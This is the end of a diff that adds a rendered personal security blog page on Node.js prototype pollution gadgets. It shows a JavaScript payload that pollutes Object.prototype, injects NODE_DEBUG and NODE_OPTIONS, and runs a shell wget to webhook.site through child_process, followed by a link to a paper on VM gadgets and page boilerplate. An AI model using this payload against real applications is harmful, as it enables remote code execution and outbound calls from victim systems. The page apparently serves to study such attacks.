+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'/opt/yarn-v1.22.19'</span>
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>shell <span class="token operator">=</span> <span class="token string">"node"</span>
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">"npm_config_global"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>env <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+<span class="token string-property property">"NODE_DEBUG"</span><span class="token operator">:</span> <span class="token string">"console.log(require('child_process').execSync('wget$&#123;IFS&#125;https://webhook.site?q=2').toString());process.exit()//"</span><span class="token punctuation">,</span>
+<span class="token string-property property">"NODE_OPTIONS"</span><span class="token operator">:</span> <span class="token string">"--require=/proc/self/environ"</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./usage.js'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="VM-Gadgets"><a href="#VM-Gadgets" class="headerlink" title="VM Gadgets"></a>VM Gadgets</h1><p><a target="_blank" rel="noopener" href="https://arxiv.org/pdf/2207.11171">https://arxiv.org/pdf/2207.11171</a></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
